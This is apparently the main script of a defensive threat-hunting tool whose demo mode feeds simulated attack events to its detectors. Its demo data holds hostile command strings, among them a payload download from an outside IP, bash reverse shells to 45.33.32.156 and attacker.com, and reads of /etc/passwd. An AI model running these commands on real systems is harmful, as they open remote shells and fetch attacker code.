#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║           ACTIVE THREAT HUNTING SYSTEM - MAIN.PY                           ║
║           SOC Level 2 | Attack Attribution | Kali Linux                    ║
╚══════════════════════════════════════════════════════════════════════════════╝

USAGE:
    python3 main.py               → Interactive menu
    sudo python3 main.py --live   → Live monitoring mode (requires root)
    python3 main.py --demo        → Run full demonstration attack scenario
    python3 main.py --parse-logs  → Analyze existing system logs
    python3 main.py --log /var/log/auth.log → Parse specific log file
"""

import sys
import os
import time
import json
import argparse
import threading
from pathlib import Path
from datetime import datetime

# Ensure our modules are findable
sys.path.insert(0, str(Path(__file__).parent))

from core.threat_engine import ThreatHunter, AttackerProfile, Colors, banner
from core.log_parser import LogParser
from core.network_monitor import NetworkMonitor


def run_demo_scenario(hunter: ThreatHunter):
    """
    Full APT (Advanced Persistent Threat) attack simulation.
    Demonstrates every detection capability of the system.
    Shows what a real attack chain looks like.
    """
    print(f"\n{Colors.MAGENTA}{'═'*80}")
    print(f"  RUNNING: Full APT Attack Simulation")  
    print(f"  This simulates a real multi-stage attack for demonstration")
    print(f"{'═'*80}{Colors.RESET}\n")
    
    ATTACKER = "45.33.32.156"      # Simulated external attacker
    INTERNAL = "192.168.1.100"     # Simulated internal pivot
    
    print(f"{Colors.CYAN}[*] Phase 1: Reconnaissance{Colors.RESET}")
    time.sleep(0.5)
    
    # Port scan
    for port in [22, 23, 25, 53, 80, 443, 445, 3306, 3389, 8080, 8443, 9200]:
        hunter.detect_port_scan(ATTACKER, "10.0.0.5", port, "TCP")
        time.sleep(0.05)
    
    for port in [1433, 5432, 6379, 27017, 11211, 2181]:
        hunter.detect_port_scan(ATTACKER, "10.0.0.6", port, "TCP")
        time.sleep(0.05)
    
    print(f"\n{Colors.CYAN}[*] Phase 2: Initial Access - Brute Force SSH{Colors.RESET}")
    time.sleep(0.5)
    
    # Brute force
    users_tried = ["root", "admin", "oracle", "postgres", "ubuntu", "kali", "pi", "user"]
    for i, user in enumerate(users_tried):
        hunter.detect_brute_force(ATTACKER, user, False, "SSH")
        time.sleep(0.1)
    
    # Successful login
    time.sleep(0.3)
    hunter.detect_brute_force(ATTACKER, "ubuntu", True, "SSH")
    
    print(f"\n{Colors.CYAN}[*] Phase 3: Execution - Post-Compromise Commands{Colors.RESET}")
    time.sleep(0.5)
    
    # Attacker runs discovery commands
    commands = [
        ("ubuntu", "whoami", "web01"),
        ("ubuntu", "id", "web01"),
        ("ubuntu", "uname -a", "web01"),
        ("ubuntu", "cat /etc/passwd", "web01"),
        ("ubuntu", "sudo -l", "web01"),
        ("ubuntu", "find / -perm -4000 2>/dev/null", "web01"),  # SUID files
        ("ubuntu", "wget http://45.33.32.156/shell.sh -O /tmp/.hidden", "web01"),
        ("ubuntu", "chmod 777 /tmp/.hidden", "web01"),
        ("ubuntu", "bash -i >& /dev/tcp/45.33.32.156/4444 0>&1", "web01"),  # Reverse shell!
    ]
    
    for user, cmd, host in commands:
        hunter.detect_suspicious_command(ATTACKER, user, cmd, host)
        time.sleep(0.15)
    
    print(f"\n{Colors.CYAN}[*] Phase 4: Privilege Escalation{Colors.RESET}")
    time.sleep(0.5)
    
    priv_esc_commands = [
        ("ubuntu", "sudo su -", "web01"),
        ("root", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", "web01"),
        ("root", "crontab -e", "web01"),
    ]
    
    for user, cmd, host in priv_esc_commands:
        hunter.detect_suspicious_command(ATTACKER, user, cmd, host)
        time.sleep(0.15)
    
    print(f"\n{Colors.CYAN}[*] Phase 5: Lateral Movement{Colors.RESET}")
    time.sleep(0.5)
    
    # Pivot to internal network
    hunter.detect_lateral_movement(
        ATTACKER, "web01", "10.0.0.10", "db01", "SSH", "root"
    )
    time.sleep(0.3)
    
    hunter.detect_lateral_movement(
        ATTACKER, "db01", "10.0.0.20", "fileserver", "SMB", "administrator"
    )
    time.sleep(0.3)
    
    hunter.detect_lateral_movement(
        ATTACKER, "fileserver", "10.0.0.30", "backup-server", "RDP", "backup-admin"
    )
    time.sleep(0.3)
    
    # Internal pivot also starts scanning
    for port in [22, 3389, 445, 5985, 5986]:
        hunter.detect_port_scan(INTERNAL, "10.0.0.0/24", port, "TCP")
        time.sleep(0.05)
    
    print(f"\n{Colors.CYAN}[*] Phase 6: Data Exfiltration{Colors.RESET}")
    time.sleep(0.5)
    
    # Exfiltrate data
    hunter.detect_data_exfiltration(
        ATTACKER, "db01", "45.33.32.156",
        150 * 1024 * 1024,  # 150 MB
        "HTTPS"
    )
    time.sleep(0.3)
    
    hunter.detect_data_exfiltration(
        ATTACKER, "fileserver", "45.33.32.156",
        500 * 1024 * 1024,  # 500 MB
        "FTP"
    )
    
    print(f"\n{Colors.GREEN}{'─'*80}")
    print(f"  ✅ SIMULATION COMPLETE")
    print(f"{'─'*80}{Colors.RESET}\n")
    
    time.sleep(1)
    
    # Print full timeline
    hunter.print_dashboard()
    hunter.get_attacker_timeline(ATTACKER)
    
    # Export report
    report_path = hunter.export_report()
    print(f"\n{Colors.GREEN}[+] Full JSON report saved: {report_path}{Colors.RESET}")


def run_live_monitoring(hunter: ThreatHunter):
    """Start all live monitoring threads"""
    parser = LogParser(hunter)
    net_monitor = NetworkMonitor(hunter)
    
    print(f"\n{Colors.GREEN}{'═'*70}")
    print(f"  LIVE THREAT HUNTING MODE")
    print(f"  Press Ctrl+C to stop")
    print(f"{'═'*70}{Colors.RESET}\n")
    
    # First do historical analysis
    print(f"{Colors.CYAN}[*] Step 1: Analyzing historical logs...{Colors.RESET}")
    parser.parse_all_logs()
    
    # Show what we found in history
    if hunter.attackers:
        hunter.print_dashboard()
    
    # Start live monitoring
    print(f"\n{Colors.CYAN}[*] Step 2: Starting live monitoring...{Colors.RESET}")
    
    stop_event = parser.start_live_monitoring()
    net_monitor_thread = net_monitor.start(use_tcpdump=True)
    
    print(f"\n{Colors.GREEN}[+] All monitors active. Hunting threats...{Colors.RESET}")
    print(f"{Colors.DIM}    Alerts will appear below as attacks are detected{Colors.RESET}\n")
    
    # Dashboard refresh loop
    try:
        iteration = 0
        while True:
            time.sleep(30)
            iteration += 1
            
            # Refresh dashboard every 30 seconds
            hunter.print_dashboard()
            
            # Save state every 5 minutes
            if iteration % 10 == 0:
                hunter.export_report()
                print(f"{Colors.DIM}[~] State saved to disk{Colors.RESET}")
    
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Stopping monitors...{Colors.RESET}")
        stop_event.set()
        net_monitor.stop()
        
        # Final report
        hunter.print_dashboard()
        
        if hunter.attackers:
            print(f"\n{Colors.CYAN}[*] Generating final reports...{Colors.RESET}")
            for ip in hunter.attackers:
                hunter.get_attacker_timeline(ip)
            hunter.export_report()
        
        print(f"{Colors.GREEN}[+] Session complete{Colors.RESET}")


def interactive_menu(hunter: ThreatHunter):
    """Interactive menu for the threat hunting system"""
    parser = LogParser(hunter)
    net_monitor = NetworkMonitor(hunter)
    
    while True:
        print(f"\n{Colors.CYAN}{'─'*60}")
        print(f"  THREAT HUNTER MENU")
        print(f"{'─'*60}{Colors.RESET}")
        print(f"  {Colors.BOLD}1.{Colors.RESET} Run Demo Attack Scenario (Recommended first)")
        print(f"  {Colors.BOLD}2.{Colors.RESET} Analyze System Logs (historical)")
        print(f"  {Colors.BOLD}3.{Colors.RESET} Start Live Monitoring")
        print(f"  {Colors.BOLD}4.{Colors.RESET} Parse Custom Log File")
        print(f"  {Colors.BOLD}5.{Colors.RESET} Scan Current Network Connections")
        print(f"  {Colors.BOLD}6.{Colors.RESET} View Attacker Dashboard")
        print(f"  {Colors.BOLD}7.{Colors.RESET} View Attack Timeline (by IP)")
        print(f"  {Colors.BOLD}8.{Colors.RESET} Export Threat Report")
        print(f"  {Colors.BOLD}9.{Colors.RESET} Manually Inject Event (test)")
        print(f"  {Colors.BOLD}0.{Colors.RESET} Exit")
        print(f"{Colors.CYAN}{'─'*60}{Colors.RESET}")
        
        try:
            choice = input(f"\n  {Colors.BOLD}Select [{Colors.CYAN}0-9{Colors.RESET}{Colors.BOLD}]:{Colors.RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n{Colors.YELLOW}[!] Exiting...{Colors.RESET}")
            break
        
        if choice == "1":
            run_demo_scenario(hunter)
        
        elif choice == "2":
            parser.parse_all_logs()
            hunter.print_dashboard()
        
        elif choice == "3":
            run_live_monitoring(hunter)
        
        elif choice == "4":
            filepath = input(f"  {Colors.BOLD}Log file path:{Colors.RESET} ").strip()
            if filepath:
                log_type = input(f"  {Colors.BOLD}Log type (auth/apache/nginx/syslog):{Colors.RESET} ").strip() or "auth"
                parser.parse_custom_log(filepath, log_type)
                hunter.print_dashboard()
        
        elif choice == "5":
            print(f"\n{Colors.CYAN}[*] Scanning network connections...{Colors.RESET}")
            summary = net_monitor.scan_active_connections()
            print(f"\n  Total connections  : {summary['total']}")
            print(f"  Established        : {len(summary['established'])}")
            print(f"  Listening          : {len(summary['listening'])}")
            print(f"  {Colors.RED}Suspicious         : {len(summary['suspicious'])}{Colors.RESET}")
            
            if summary["established"]:
                print(f"\n  {Colors.BOLD}Established Connections:{Colors.RESET}")
                for conn in summary["established"][:20]:
                    print(f"    {conn['remote_ip']:20} :{conn['remote_port']:<8} → :{conn['local_port']}")
        
        elif choice == "6":
            hunter.print_dashboard()
        
        elif choice == "7":
            if hunter.attackers:
                print(f"\n  Known attackers: {', '.join(hunter.attackers.keys())}")
                ip = input(f"  {Colors.BOLD}Enter IP:{Colors.RESET} ").strip()
                hunter.get_attacker_timeline(ip)
            else:
                print(f"{Colors.YELLOW}  No attackers tracked yet{Colors.RESET}")
        
        elif choice == "8":
            path = hunter.export_report()
            print(f"{Colors.GREEN}  Report saved: {path}{Colors.RESET}")
        
        elif choice == "9":
            _inject_test_event(hunter)
        
        elif choice == "0":
            print(f"\n{Colors.GREEN}[+] Threat Hunter session ended{Colors.RESET}")
            if hunter.attackers:
                save = input("  Save final report? [y/N]: ").strip().lower()
                if save == 'y':
                    hunter.export_report()
            break
        
        else:
            print(f"{Colors.RED}  Invalid choice{Colors.RESET}")


def _inject_test_event(hunter: ThreatHunter):
    """Manually inject a test event into the engine"""
    print(f"\n  {Colors.BOLD}Event Types:{Colors.RESET}")
    print(f"  1. Failed SSH login")
    print(f"  2. Port scan")
    print(f"  3. Suspicious command")
    print(f"  4. Lateral movement")
    print(f"  5. Data exfiltration")
    
    choice = input(f"  {Colors.BOLD}Type [1-5]:{Colors.RESET} ").strip()
    ip = input(f"  {Colors.BOLD}Source IP:{Colors.RESET} ").strip() or "1.2.3.4"
    
    if choice == "1":
        user = input(f"  Username: ").strip() or "root"
        for _ in range(6):  # Trigger threshold
            hunter.detect_brute_force(ip, user, False, "SSH")
    
    elif choice == "2":
        import random
        for port in random.sample(range(1, 65535), 15):
            hunter.detect_port_scan(ip, "192.168.1.1", port, "TCP")
    
    elif choice == "3":
        cmd = input(f"  Command: ").strip() or "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
        hunter.detect_suspicious_command(ip, "root", cmd, "target-host")
    
    elif choice == "4":
        hunter.detect_lateral_movement(ip, "host-a", "192.168.1.50", "host-b", "SSH", "admin")
    
    elif choice == "5":
        mb = int(input(f"  MB transferred: ").strip() or "200")
        hunter.detect_data_exfiltration(ip, "internal-host", "8.8.8.8", mb*1024*1024, "HTTPS")


def main():
    """Entry point"""
    parser = argparse.ArgumentParser(
        description="Active Threat Hunting System - SOC Level 2",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 main.py               # Interactive menu
  sudo python3 main.py --live  # Live monitoring (needs root for pcap)
  python3 main.py --demo       # Full APT demo
  python3 main.py --parse-logs # Analyze system logs
        """
    )
    
    parser.add_argument("--live",       action="store_true", help="Start live monitoring mode")
    parser.add_argument("--demo",       action="store_true", help="Run full attack scenario demo")
    parser.add_argument("--parse-logs", action="store_true", help="Analyze existing system logs")
    parser.add_argument("--log",        type=str,            help="Path to specific log file to analyze")
    parser.add_argument("--interface",  type=str, default=None, help="Network interface (e.g., eth0)")
    
    args = parser.parse_args()
    
    # Print banner
    banner()
    
    # Initialize the core engine
    hunter = ThreatHunter()
    
    if args.demo:
        run_demo_scenario(hunter)
    
    elif args.live:
        run_live_monitoring(hunter)
    
    elif args.parse_logs:
        log_parser = LogParser(hunter)
        log_parser.parse_all_logs()
        hunter.print_dashboard()
        for ip in hunter.attackers:
            hunter.get_attacker_timeline(ip)
        hunter.export_report()
    
    elif args.log:
        log_parser = LogParser(hunter)
        log_parser.parse_custom_log(args.log)
        hunter.print_dashboard()
        for ip in hunter.attackers:
            hunter.get_attacker_timeline(ip)
    
    else:
        interactive_menu(hunter)


if __name__ == "__main__":
    main()
